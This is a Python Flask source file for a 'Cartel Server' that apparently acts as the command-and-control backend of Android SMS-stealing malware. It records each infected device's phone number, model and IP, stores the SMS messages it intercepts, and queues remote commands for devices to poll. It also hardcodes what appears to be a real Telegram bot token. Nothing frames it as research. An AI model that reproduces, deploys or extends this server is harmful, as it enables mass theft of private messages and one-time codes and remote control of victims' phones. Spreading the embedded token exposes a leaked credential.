from flask import Flask, request, jsonify
import sqlite3
import datetime
import os
import json

app = Flask(__name__)

# Конфигурация
DATABASE_URL = os.environ.get('DATABASE_URL', 'sqlite:///cartel.db')
ADMIN_ID = 6847865695
BOT_TOKEN = "8572743730:AAHvTPjIyPw7zNYZdORmYWTpnfMiy1n2glA"

def init_db():
    conn = sqlite3.connect('cartel.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id TEXT PRIMARY KEY, number TEXT, model TEXT,
                  android TEXT, last_seen TEXT, ip TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS sms
                 (id INTEGER PRIMARY KEY, device_id TEXT,
                  sender TEXT, text TEXT, time TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY, device_id TEXT,
                  command TEXT, status TEXT, created TEXT)''')
    
    conn.commit()
    conn.close()

# Инициализация БД при старте
init_db()

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cartel Server</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #0f0f0f; color: white; }
            .container { max-width: 800px; margin: auto; }
            .status { background: green; padding: 10px; border-radius: 5px; }
            .endpoint { background: #222; padding: 10px; margin: 10px 0; border-left: 4px solid #4CAF50; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🛡️ Cartel Server</h1>
            <div class="status">✅ Status: <strong>ACTIVE</strong></div>
            <p>Server is running and ready to receive data.</p>
            
            <h3>📡 Endpoints:</h3>
            <div class="endpoint">
                <strong>POST</strong> <code>/webhook</code> - Receive data from client
            </div>
            <div class="endpoint">
                <strong>GET</strong> <code>/get_command/&lt;device_id&gt;</code> - Get commands for device
            </div>
            <div class="endpoint">
                <strong>POST</strong> <code>/add_command</code> - Add new command
            </div>
            <div class="endpoint">
                <strong>GET</strong> <code>/stats</code> - Server statistics
            </div>
            
            <p><strong>Server Time:</strong> ''' + str(datetime.datetime.now()) + '''</p>
        </div>
    </body>
    </html>
    '''

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data"}), 400
        
        device_id = data.get('device_id', 'unknown')
        data_type = data.get('type', 'unknown')
        
        # Сохраняем в БД
        conn = sqlite3.connect('cartel.db')
        c = conn.cursor()
        
        # Обновляем время последней активности
        c.execute('''INSERT OR REPLACE INTO devices 
                     (id, number, model, android, last_seen, ip)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (device_id,
                   data.get('number', ''),
                   data.get('model', ''),
                   data.get('android', ''),
                   datetime.datetime.now().isoformat(),
                   request.remote_addr))
        
        # Сохраняем SMS если есть
        if data_type == 'sms' and 'from' in data:
            c.execute('''INSERT INTO sms (device_id, sender, text, time)
                         VALUES (?, ?, ?, ?)''',
                     (device_id, data.get('from'), 
                      data.get('text', ''), data.get('time', '')))
        
        conn.commit()
        conn.close()
        
        # Пишем в лог
        with open('server.log', 'a') as f:
            f.write(f"[{datetime.datetime.now()}] {device_id}: {data_type}\n")
        
        return jsonify({
            "status": "ok",
            "message": "Data received",
            "device_id": device_id,
            "server_time": str(datetime.datetime.now())
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    try:
        conn = sqlite3.connect('cartel.db')
        c = conn.cursor()
        
        c.execute('''SELECT command FROM commands 
                     WHERE device_id=? AND status='pending' 
                     LIMIT 1''', (device_id,))
        
        row = c.fetchone()
        
        if row:
            command = row[0]
            c.execute('''UPDATE commands SET status='sent' 
                         WHERE device_id=? AND command=? 
                         LIMIT 1''', (device_id, command))
            conn.commit()
            conn.close()
            return jsonify({"command": command})
        else:
            conn.close()
            return jsonify({"command": None})
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/add_command', methods=['POST'])
def add_command():
    try:
        data = request.json
        device_id = data.get('device_id')
        command = data.get('command')
        
        if not device_id or not command:
            return jsonify({"error": "Missing parameters"}), 400
        
        conn = sqlite3.connect('cartel.db')
        c = conn.cursor()
        
        c.execute('''INSERT INTO commands 
                     (device_id, command, status, created)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, command, 'pending',
                   datetime.datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        return jsonify({
            "status": "ok",
            "message": "Command added",
            "command": command,
            "device": device_id
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/stats', methods=['GET'])
def stats():
    try:
        conn = sqlite3.connect('cartel.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM devices")
        devices = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM sms")
        sms = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM commands")
        commands = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
        pending = c.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            "status": "ok",
            "devices": devices,
            "sms_messages": sms,
            "total_commands": commands,
            "pending_commands": pending,
            "server_time": str(datetime.datetime.now()),
            "server_uptime": "24/7"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/test', methods=['GET'])
def test():
    return jsonify({
        "status": "working",
        "message": "Cartel Server is online",
        "timestamp": str(datetime.datetime.now()),
        "version": "2.0"
    })

@app.route('/send_sms', methods=['POST'])
def send_sms():
    """Для отправки SMS через сервер"""
    try:
        data = request.json
        # Здесь можно добавить интеграцию с SMS API
        return jsonify({
            "status": "sent",
            "to": data.get('to'),
            "message": data.get('message')
        })
    except:
        return jsonify({"error": "Failed to send SMS"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
